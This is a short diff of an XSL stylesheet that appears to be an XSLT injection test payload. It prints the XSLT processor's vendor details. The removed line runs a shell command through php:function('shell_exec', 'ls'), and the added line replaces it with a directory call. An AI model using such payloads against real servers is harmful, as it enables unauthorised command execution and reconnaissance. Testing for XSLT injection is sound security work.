@@ -10,7 +10,7 @@
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
   
-  EXEC : <xsl:value-of select="php:function('shell_exec', 'ls')" />
+  EXEC : <xsl:value-of select="php:function('dir', './')" />
   
   
  <xsl:if test="system-property('xsl:product-name')">
